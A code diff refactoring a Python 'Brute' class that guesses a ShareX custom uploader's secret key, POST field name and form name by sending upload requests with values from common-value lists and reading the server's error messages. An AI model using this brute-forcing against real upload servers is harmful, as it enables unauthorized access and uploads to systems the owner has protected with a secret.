@@ -46,14 +46,13 @@ class Brute:
             return None
 
     @staticmethod
-    def secret(url, field_name):
+    def secret(upload_url, field_name):
         """ Brute force custom image uploader secret key """
-        file_data = io.BytesIO(b'Hello world!')
-        invalid_file_name = 'AAAA'
+        invalid_file_name = 'A'
 
         for secret in Brute.COMMON_SECRETS:
             try:
-                res = ShareX.upload(url, file_data, file_name=invalid_file_name, secret=secret, field_name=field_name)
+                res = ShareX.upload(upload_url, file_name=invalid_file_name, secret=secret, field_name=field_name)
 
                 if ShareX.Errors.UPLOAD_FAILED.value['content'].lower() in res.text.lower():
                     return secret
@@ -63,14 +62,13 @@ class Brute:
         return None
 
     @staticmethod
-    def field_name(url):
+    def field_name(upload_url):
         """ Brute force custom image uploader secret key POST data field name """
-        file_data = io.BytesIO(b'Hello world!')
-        secret = 'abc'
+        invalid_secret = '!abc++'
 
         for field_name in Brute.COMMON_FIELD_NAMES:
             try:
-                res = ShareX.upload(url, file_data, field_name=field_name, secret=secret)
+                res = ShareX.upload(upload_url, secret=invalid_secret, field_name=field_name)
                 if ShareX.Errors.INVALID_SECRET.value['content'].lower() in res.text.lower():
                     return field_name
             except Exception:
@@ -79,13 +77,11 @@ class Brute:
         return None
 
     @staticmethod
-    def form_name(url, secret, field_name):
+    def form_name(upload_url, secret, field_name):
         """ Brute force custom image uploader multipart file form name """
-        file_data = io.BytesIO(b'Hello world!')
-
         for form_name in Brute.COMMON_FORM_NAMES:
             try:
-                res = ShareX.upload(url, file_data, form_name=form_name, field_name=field_name, secret=secret)
+                res = ShareX.upload(upload_url, form_name=form_name, field_name=field_name, secret=secret)
 
                 if not ShareX.Errors.UPLOAD_FAILED.value['content'].lower() in res.text.lower():
                     return form_name
